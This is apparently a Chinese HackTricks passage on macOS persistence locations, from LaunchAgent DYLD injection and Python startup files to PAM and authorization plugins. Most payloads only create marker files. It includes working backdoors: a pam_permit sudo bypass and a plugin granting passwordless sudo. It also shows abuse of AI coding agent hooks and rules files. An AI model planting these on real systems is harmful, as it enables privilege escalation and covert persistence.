### DYLD_INSERT_LIBRARIES 持久化

- 可用于绕过 sandbox：[🔴](https://emojipedia.org/large-red-circle)
  - dyld 会从 SIP/platform 二进制文件、启用了 hardened runtime 的应用和 setuid 目标中**剥离** `DYLD_*`，因此只会注入未受保护的进程，且**不会**绕过 SIP 或 hardened runtime
- TCC 绕过：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- 可靠方式：在恶意 `LaunchAgent`/`LaunchDaemon` plist 中设置 **`EnvironmentVariables`** 字典（在登录/启动时运行）
- 已失效/历史方式（仅作说明）：**`~/.MacOSX/environment.plist`**（在 10.8 中移除）和 **`/etc/launchd.conf`**（在 10.10 中移除）

#### 描述与利用

如果攻击者能将 `DYLD_INSERT_LIBRARIES` 写入受害进程的环境变量，dyld 就会将攻击者的 dylib 加载到该进程中（并运行其 constructor）。持久化变体会将该变量嵌入 LaunchAgent，因此每次启动该任务时都会重新注入。请注意，现代 macOS 会过滤 `launchctl setenv DYLD_*`，因此应将其嵌入 plist 中。<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

有关 dylib injection/hijacking 的完整机制，请参阅：

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### AI Coding Agent CLIs（hooks、MCP servers、rules files）

案例分析：[CVE-2025-59536（Check Point）](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>，[Rules File Backdoor（Pillar Security）](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 开发者必须使用相关 agent。agent 接受其配置后，启动命令会以该用户的权限运行；workspace trust 和 MCP approval 因产品和会话模式而异。
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)（以用户身份运行；继承终端/agent 已有的权限）

#### 位置

显式的 hook 和 MCP 配置文件可以在开发者使用工具时导致 **shell 命令或子进程运行**——配置可以来自用户级全局文件（持久化），也可以来自仓库中提交的文件（供应链攻击）。`CLAUDE.md`、`AGENTS.md`、`GEMINI.md` 和编辑器 rules 是 **给 agent 的指令**，读取时不保证会执行 shell 命令；其效果取决于 agent 的行为和工具权限。请检查各产品当前的信任和审批规则。

- **Claude Code**
  - `~/.claude/settings.json`、项目中的 `.claude/settings.json`、`.claude/settings.local.json`，以及仅 root 可访问的 **`/Library/Application Support/ClaudeCode/managed-settings.json`**（MDM/托管设置 **无法被用户覆盖** → 强持久化）
  - `hooks` 对象——事件 `PreToolUse`、`PostToolUse`、`UserPromptSubmit`、`Stop`、`SubagentStop`、`SessionStart`、`SessionEnd`、`Notification`、`PreCompact`——每个事件都会运行一个 shell `command`
  - `statusLine.command`——用于渲染状态行的 shell 命令（每个会话都会执行）
  - `~/.claude.json` / 项目 `.mcp.json` 中的 MCP servers——作为子进程启动的 `command`+`args`
  - `CLAUDE.md` / `~/.claude/CLAUDE.md`——可尝试 prompt injection 的指令，其效果取决于 agent 的行为和工具权限
- **OpenAI Codex CLI**：`~/.codex/config.toml` `[mcp_servers.*]`（`command`/`args` 作为子进程启动）；项目指令 `AGENTS.md`
- **Gemini CLI**：`~/.gemini/settings.json`（`hooks`、MCP servers）；`GEMINI.md`
- **Cursor**：`~/.cursor/hooks.json`（`beforeShellExecution`、`afterAgentResponse`、`stop`、…运行命令）；`.cursor/rules/`、`.cursorrules`、`~/.cursor/mcp.json`；GitHub Copilot `.github/copilot-instructions.md`

#### 描述与利用

如果攻击者能够修改账户的用户级全局设置，其 hook 或 MCP 命令便可在该账户之后的会话中运行。由仓库控制的配置则属于另一种情况：[当前 Claude Code 安全文档](https://code.claude.com/docs/en/security)说明，交互式 workspace trust 对话框与项目 `.mcp.json` servers 的单独审批提示是分开的。[其权限矩阵](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder)指出，信任父文件夹后 hooks 可以运行；`claude -p`/SDK 会话不会显示交互式信任提示；在这些非交互模式下，项目 MCP servers 无需审批提示即可连接。CVE-2025-59536 报告的信任前项目 hook bypass 已于[2025 年修复](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)；不要将其视为当前的默认行为。攻击投递途径可能包括被攻陷的仓库或恶意安装程序。通过 rules file 进行的 prompt injection 不如显式 hook 确定，且仍取决于工具审批。<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Claude Code 用户级全局设置示例；测试时仅在一次性账户中使用：

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

用户全局 Codex MCP 配置示例：

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Cursor hook 配置示例；使用前请检查其已安装版本的 schema：

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### 浏览器扩展（Chromium：Chrome / Brave / Edge）

说明：[Chrome 外部扩展](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>、[macOS 上滥用 ExtensionInstallForcelist](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 需要使用受支持的浏览器，并安装且启用扩展。在 macOS 上，External Extensions 需要用户确认；托管强制安装则需要适用的企业策略。
- TCC 绕过：[🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> 这不同于**原生消息主机**（参见上文 *Chrome 原生消息主机* 一节）。这里的持久化方式是**自动安装的扩展**本身。

#### 位置

- **External Extensions JSON**（浏览器启动时发现，之后在 macOS 上会提示用户是否启用）：
  - Chrome：`~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json`（按用户）或 `/Library/Application Support/Google/Chrome/External Extensions/`（所有用户）
  - Brave：`~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge：`~/Library/Application Support/Microsoft Edge/External Extensions/`
- 通过托管偏好设置 / 配置描述文件进行**企业策略强制安装**：
  - `com.google.Chrome` 键 `ExtensionInstallForcelist`（Brave 使用 `com.brave.Browser`，Edge 使用 `com.microsoft.Edge`），从 `/Library/Managed Preferences/` 或已安装的 `.mobileconfig` 中读取

#### 说明与利用

这两种安装途径彼此不同。Chrome 的[外部安装文档](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)说明，通过 *External Extensions* 文件提供的扩展，**Windows 和 macOS 用户必须确认并启用**；仅写入该 JSON 文件并不会执行扩展。在 macOS 上为所有用户安装时，Chrome 还要求保护外部扩展文件，避免其被低权限用户修改。托管的 `ExtensionInstallForcelist` 或 `ExtensionSettings` 策略可以在无需用户交互的情况下安装并固定扩展；[Google 的 Mac 策略指南](https://support.google.com/chrome/a/answer/7517624)介绍了托管配置，并说明用户无法移除强制安装的扩展。这是策略部署途径，并非按用户设置的 `defaults write` 快捷方式。<sup>[[49]](#references)</sup>

> [!WARNING]
> 在 macOS 上，*External Extensions* JSON manifest 必须指向 **Chrome Web Store** 更新 URL，而不能指向本地 CRX。托管策略部署有自身的企业前提条件，并且可能允许使用托管的自托管更新 URL。对于测试配置文件中的本地解包扩展，Chrome 的开发者模式 `--load-extension=/path` 开关是一种独立机制，不会让 External Extensions JSON 文件自动执行。不要把写入 `Secure Preferences` 视为等同于上述任一有文档说明的注册途径。

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

在该一次性账户中启动 Chrome 并观察启用提示；用户接受后，扩展自身的行为就是执行 PoC。测试完成后，移除 manifest，并在该配置文件中停用或卸载扩展。研究用 Mac 上的活动 Chrome 配置文件未测试此路径。也未在该设备上部署 managed-policy 路径。

Force-install 和 External Extensions 参考的是 **Chrome Web Store** 扩展 ID；关于通过编辑配置文件中经 HMAC 签名的 `Secure Preferences` 静默注入本地扩展这一更底层的技巧，以及其他 Chromium-process 滥用方式，请参阅：

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### URL Scheme 和文件类型处理程序 (LaunchServices)

文章：[通过自定义 URL Schemes 远程利用 Mac (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 触发方式是受害者点击链接（例如在 Chrome/Brave/Safari 中），或打开已注册类型的文件
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- App bundle 的 `Info.plist` 声明 **`CFBundleURLTypes`/`CFBundleURLSchemes`**（自定义 URL scheme）或 **`CFBundleDocumentTypes`**（文件扩展名/UTI）
- 每用户生效的默认设置可能出现在 **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`**（`LSHandlers` 数组）中。Apple 提供的用于选择 URL scheme 默认处理程序的 API 是 `LSSetDefaultHandlerForURLScheme`；直接写入该 plist 并非有文档说明的注册或缓存更新方法。

#### 描述与利用

Launch Services 从已注册 App 的 `Info.plist` 中获取 URL scheme 和文档声明。[Apple 的注册指南](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html)指出，Finder 发现 App、系统启动或用户登录时，或者通过显式注册 API，都可能触发注册；仅仅将 App 写入某个位置并不能保证立即触发注册。注册后，打开匹配的 URL 或文档可能会启动所选的处理程序 App，但仍受用户的默认处理程序选择和 macOS 常规启动检查的约束。受支持的 `LSSetDefaultHandlerForURLScheme` API 会更改用户首选的 URL 处理程序；它不会让新放入的 App 自动执行。<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

在 macOS 26.5.2 研究用 Mac 上，没有注册任何 app，也没有更改任何 handler 首选项。要测试实际的 handler，请使用一次性用户账户，注册一个仅包含 marker、使用唯一 scheme 的 app，调用其 URL，然后移除该 app 及其注册信息。

有关深入枚举/滥用文件扩展名和 URL scheme handler 的内容，请参阅：

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

<a id="python-startup-files-pth--usercustomize--sitecustomize"></a>

### Python 启动文件（`.pth` / `.start` / `usercustomize` / `sitecustomize`）

说明：[https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 仅当相关 Python interpreter 启动时启用了该 site 目录才会运行；不同 virtual environment、Python build 或启动标志下，触发条件并不通用
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)
  - 以启动 interpreter 的进程所具有的权限/TCC 运行

#### 位置

- **`$(python3 -m site --user-site)/*.pth`**（macOS framework build：`~/Library/Python/<X.Y>/lib/python/site-packages/`）
  - 不需要 root（用户可写）
  - **触发条件**：该 Python build 启动且启用了其 user site；`site` module 会处理活动 site 目录中的 `.pth` 文件
- **`<site-packages>/*.start`**（Python 3.15+；用户或 interpreter 的 site 目录）
  - **触发条件**：包含该目录并加载 `site` 的 interpreter 启动时。<sup>[[58]](#references)[[59]](#references)</sup>
- **`<user-site>/usercustomize.py`**
  - 不需要 root
  - **触发条件**：启用 user site 后启动（由 `site` 自动导入）
- **`<prefix>/site-packages/sitecustomize.py`**（例如 `/opt/homebrew/lib/python3.13/site-packages/`，或系统路径）
  - 根据 interpreter 的位置，可能需要 root/admin 权限
  - **触发条件**：包含该 site 目录的 interpreter 启动时

#### 描述与利用

Python 启动时通常会导入 `site`，并扫描活动的 `site-packages` 目录以查找 `.pth` 文件。除了添加路径外，以 `import ` 开头的 `.pth` 行还会执行 Python 代码，即使之后从未使用过其中指定的 module。Python 也会尝试导入 `sitecustomize`，并且**在启用 user site 时**导入 `usercustomize`。<sup>[[56]](#references)</sup> 触发条件是之后启动一个能够访问已修改目录的 interpreter。`-S` 会禁用 `site` 处理；`-s`、`-I` 或 `PYTHONNOUSERSITE` 会禁用 **user-site** 变体。`-I` 通常不会禁用全局的 `sitecustomize`。Virtual environment 也可能排除 user site。请对特定 interpreter 执行 `python3 -m site` 进行检查。

在 **Python 3.15 及更高版本**中，site 目录还可以包含一个带有 `pkg.mod:callable` entry point 的 `<name>.start`。site module 会在 interpreter 启动时导入该 module 并调用无参数函数，即使应用从未导入该 package。例如，包含 `foo.submod:initialize` 的 `foo.start` 会在用户代码运行前调用 `foo.submod.initialize()`。能够写入活动 site 目录的 package 或 actor 可以利用这条启动路径；它并非 macOS 独有。如果 `foo.start` 与 `foo.pth` 同时存在，Python 3.15+ 会跳过 `.pth` 中的 import 行，改用 `.start` entry；而较早版本的 interpreter 会忽略 `.start`，仍执行 `.pth` 行。跨 interpreter 测试 wheel 时，这一版本差异很重要。<sup>[[58]](#references)[[59]](#references)[[60]](#references)</sup>

以下 PoC 在 macOS 26.5.2 上运行。此测试使用 `PYTHONUSERBASE` 将 user site 移至临时目录；不会修改真实的 user site：

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Both markers 均出现了。在此测试中，使用 `-s`、`-I` 或 `-S` 均可阻止这两个 **user-site** 标记。未测试全局 site 目录中的 `sitecustomize`。

## Root Sandbox Bypass

> [!TIP]
> 在这里可以找到适用于 **sandbox bypass** 的启动位置，让你只需**将内容写入文件**即可执行某些操作，但需要具备 **root** 权限和/或满足其他**特殊条件**。

### Periodic

> [!CAUTION]
> **历史机制：**在 macOS 26.5.2 测试机器上，`/usr/sbin/periodic`、`/etc/defaults/periodic.conf`、`/etc/periodic` 和 `com.apple.periodic-*` launch daemons 均不存在。不要假定在当前系统上创建 `/etc/periodic` 就会安排其内容运行。在使用下面的示例之前，请确认目标版本上存在该命令并启用了调度程序。

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- 可用于绕过 sandbox：[🟠](https://emojipedia.org/large-orange-circle)
  - 但需要 root 权限
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- `/etc/periodic/daily`、`/etc/periodic/weekly`、`/etc/periodic/monthly`、`/usr/local/etc/periodic`
  - 需要 root 权限
  - **触发条件**：到达指定时间时
- `/etc/daily.local`、`/etc/weekly.local` 或 `/etc/monthly.local`
  - 需要 root 权限
  - **触发条件**：到达指定时间时

#### 描述与利用

在较早的版本中，periodic 脚本（**`/etc/periodic`**）由 `/System/Library/LaunchDaemons/com.apple.periodic*` 中的 **launch daemons** 调度。从 macOS Big Sur 11.5 开始，periodic runner 会以**各文件所有者**的身份执行 periodic 目录中的脚本，从而堵住了此前的权限提升途径。<sup>[[27]](#references)</sup>下面的命令和目录列表是历史输出，并非 macOS 26.5.2 上的测试结果。

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

还有其他会执行的周期性脚本，相关配置见 **`/etc/defaults/periodic.conf`**：

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

在安装并启用了 `periodic` 及其 launch daemons 的旧系统上，`/etc/daily.local`、`/etc/weekly.local` 和 `/etc/monthly.local` 是额外的执行路径。一个无害的只读检查是：

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> 基于所有者的规则适用于直接位于 periodic 目录中的脚本。历史上的 `999.local` wrapper 会 source `/etc/daily.local`、`/etc/weekly.local` 或 `/etc/monthly.local`，但不会执行同样的所有权检查；当 scheduler 以 root 身份运行时，这些本地文件也会以 root 身份运行。此区别以及 Big Sur 11.5 的变更记录在[原始研究](https://theevilbit.github.io/beyond/beyond_0019/)中。若系统中不存在 `periodic`，就不应假定这些路径处于活动状态。

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- 可用于绕过 sandbox：[🟠](https://emojipedia.org/large-orange-circle)
  - 但需要 root 权限
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- 始终需要 root 权限

#### 描述与利用

PAM 更侧重于**持久化**和恶意软件，而非在 macOS 中轻松执行，因此本文不会详细说明，**请阅读相关 writeup，以更好地了解此技术**。<sup>[[28]](#references)</sup>

使用以下命令检查 PAM modules：

```bash
ls -l /etc/pam.d
```

一种滥用 PAM 的 persistence/privilege escalation 技术很简单：只需修改模块 /etc/pam.d/sudo，并在开头添加以下行：

```bash
auth       sufficient     pam_permit.so
```

因此它会**看起来像**这样：

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

因此，任何使用 **`sudo` 的尝试都会成功**。

> [!CAUTION]
> 请注意，此目录受 TCC 保护，因此用户很可能会收到请求访问权限的提示。

另一个很好的例子是 su，你可以看到，也可以向 PAM 模块传递参数（你也可以在这个文件中植入后门）：

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- 可用于 bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - 但需要 root 并进行额外配置
- TCC bypass: ???

#### 位置

- `/Library/Security/SecurityAgentPlugins/`
  - 需要 root 权限
  - 还需要配置 authorization database 来使用该插件

#### 描述与 Exploitation

你可以创建一个 authorization plugin，在用户登录时执行，以维持 persistence。有关如何创建这类插件的更多信息，请查看前面的 writeup（并请谨慎操作：编写不当的插件可能会让你无法登录，你需要通过 recovery mode 清理 Mac）。<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**将 bundle 移动到要加载的位置：**

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

最后添加用于加载此 Plugin 的 **rule**：

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

**`evaluate-mechanisms`** 会告知授权框架，它需要**调用外部机制进行授权**。此外，**`privileged`** 会使其以 root 身份执行。

使用以下方式触发它：

```bash
security authorize com.asdf.asdf
```

然后，**staff 组应具有 sudo** 访问权限（读取 `/etc/sudoers` 以确认）。

### Man.conf

分析文章：[https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- 可用于绕过 sandbox：[🟠](https://emojipedia.org/large-orange-circle)
  - 但你需要 root 权限，且用户必须使用 man
- TCC 绕过：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- **`/private/etc/man.conf`**
  - 需要 root 权限
  - **`/private/etc/man.conf`**：每当使用 man 时

#### 描述与利用

配置文件 **`/private/etc/man.conf`** 指定打开 man 文档时要使用的二进制文件或脚本。因此，可以修改可执行文件的路径，使用户每次使用 man 阅读文档时都会执行一个后门。<sup>[[31]](#references)</sup>

例如，在 **`/private/etc/man.conf`** 中设置：

```
MANPAGER /tmp/view
```

然后将 `/tmp/view` 创建为：

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- 可用于绕过 sandbox：[🟠](https://emojipedia.org/large-orange-circle)
  - 但需要 root 权限，并且 Apache 必须正在运行
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)
  - Httpd 没有 entitlements

#### 位置

- **`/etc/apache2/httpd.conf`**
  - 需要 root 权限
  - 触发条件：启动 Apache2 时

#### 描述与利用

你可以在 `/etc/apache2/httpd.conf` 中指定加载某个模块，添加如下行：<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

这样编译好的模块就会被 Apache 加载。唯一需要注意的是，你需要**使用有效的 Apple 证书对其签名**，或者在系统中**添加新的受信任证书**，并使用该证书**对其签名**。

然后，如有需要，为确保服务器启动，你可以执行：

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Dylb 的代码示例：

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- 可用于 bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - 但需要 root、auditd 正在运行，并且触发一条 warning
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/etc/security/audit_warn`**
  - 需要 root 权限
  - **触发条件**：auditd 检测到 warning 时

#### Description & Exploit

每当 auditd 检测到 warning，脚本 **`/etc/security/audit_warn`** 就会被**执行**。因此，你可以将 payload 添加到该脚本中。<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

你可以使用 `sudo audit -n` 强制触发警告。

### 启动项

> [!CAUTION] > **此功能已弃用，因此这些目录中不应有任何内容。**

**StartupItem** 是一个目录，应位于 `/Library/StartupItems/` 或 `/System/Library/StartupItems/` 中。创建此目录后，其中必须包含以下两个特定文件：

1. **rc 脚本**：启动时执行的 shell 脚本。
2. **plist 文件**，名称必须为 `StartupParameters.plist`，其中包含各种配置设置。

请确保 rc 脚本和 `StartupParameters.plist` 文件都正确放置在 **StartupItem** 目录中，以便启动过程能够识别并使用它们。

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> 我在自己的 macOS 中找不到这个组件，更多信息请查看相关 writeup

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Apple 引入的 **emond** 是一种日志记录机制，似乎尚未充分开发，甚至可能已被弃用，但仍可访问。虽然对 Mac 管理员来说没什么特别的用处，但这个鲜为人知的服务可能会成为威胁行为者隐蔽的持久化方式，大多数 macOS 管理员可能都不会察觉。<sup>[[34]](#references)</sup>

对于了解它存在的人来说，识别 **emond** 的恶意使用情况并不难。该服务的系统 LaunchDaemon 会在一个特定目录中查找要执行的脚本。可以使用以下命令进行检查：

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### 位置

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - 需要 root 权限
  - **触发条件**：使用 XQuartz 时

#### 描述与利用

XQuartz **已不再随 macOS 安装**，如需了解更多信息，请查看 writeup。<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> 即使拥有 root 权限，安装 kext 也非常复杂，因此除非你有 exploit，否则不应将其视为实用的 sandbox escape 或 persistence 技术。

#### 位置

要将 KEXT 安装为启动项，必须将其**安装在以下某个位置**：

- `/System/Library/Extensions`
  - 内置于 OS X 操作系统的 KEXT 文件。
- `/Library/Extensions`
  - 由第三方软件安装的 KEXT 文件

你可以使用以下命令列出当前已加载的 kext 文件：

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

有关 [**kernel extensions 的更多信息，请查看本节**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers)。

### ~~amstoold~~

Writeup：[https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### 位置

- **`/usr/local/bin/amstoold`**
  - 需要 root 权限

#### 描述与利用

显然，`/System/Library/LaunchAgents/com.apple.amstoold.plist` 中的 `plist` 使用了这个二进制文件，同时暴露了一个 XPC 服务……问题是这个二进制文件并不存在，因此你可以在该位置放置一个文件；当 XPC 服务被调用时，你的二进制文件就会被调用。<sup>[[35]](#references)</sup>

我在自己的 macOS 中已经找不到这个文件了。

### ~~xsanctl~~

